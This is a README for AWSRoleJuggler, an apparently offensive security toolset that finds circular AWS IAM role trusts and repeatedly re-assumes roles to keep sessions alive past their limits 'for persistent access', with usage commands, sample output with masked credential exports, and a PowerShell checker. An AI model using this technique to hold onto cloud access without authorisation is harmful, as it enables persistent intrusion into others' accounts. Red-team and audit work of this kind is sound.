# AWSRoleJuggler
A toolset to juggle AWS roles for persistent access

# Usage
First, use the find_cicular_trust.py tool to locate roles that create a circular trust. This is assuming the calling environment already has credentials loaded for the AWS environment:
```
python find_circular_trust.py --profile lab
[*] Found 1 cycle(s):
 Cycle 1: arn:aws:iam::123456789:role/BuildRole -> arn:aws:iam::123456789:role/ArtiRole -> arn:aws:iam::123456789:role/BuildRole

[+] Array for RoleJuggler (Compact):
["arn:aws:iam::123456789:role/BuildRole","arn:aws:iam::123456789:role/ArtiRole"]
```
Next, use the aws_role_juggler.py script to keep a role session alive for an indefinite period of time. In this example, we want to keep the BuildRole alive past the 1 hour max, so we provide the roles in the proper order:
```
ython aws_role_juggler.py --profile lab --role-list ["arn:aws:iam::123456789:role/BuildRole","arn:aws:iam::123456789:role/ArtiRole"]
[*] Attempting to assume: arn:aws:iam::123456789:role/BuildRole
[+] Successfully arn:aws:iam::123456789:role/BuildRole
[*] Expiration: 2026-03-09 17:03:42+00:00

export AWS_ACCESS_KEY_ID=ASIASFXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=UiyqqXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
export AWS_SESSION_TOKEN=IQoJb3JpZXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

[*] Juggling started. Press Ctrl+C at any time to skip the timer or exit.
[*] Current Role: arn:aws:iam::123456789:role/BuildRole
[*] Sleeping for 9m. (Ctrl+C for manual jump/exit)
```
Even though the session is requested for an hour, it is refreshed every 10 minutes, and the credentials are output to screen.

# TODO
* Automatically detect cycles and best direction for aws_role_juggler.
* Write credentials to file for logging
* Adjust session duration based on role max duration

# PSRoleJuggle
Powershell script to check for Role juggling. The script loops thorough the roles and tried to assume each one. If successful, it prints out information.
Note: AWS CLI needs to be installed and AWS credentials need to be configured.

```
powershell.exe .\rolejuggle.ps1
```
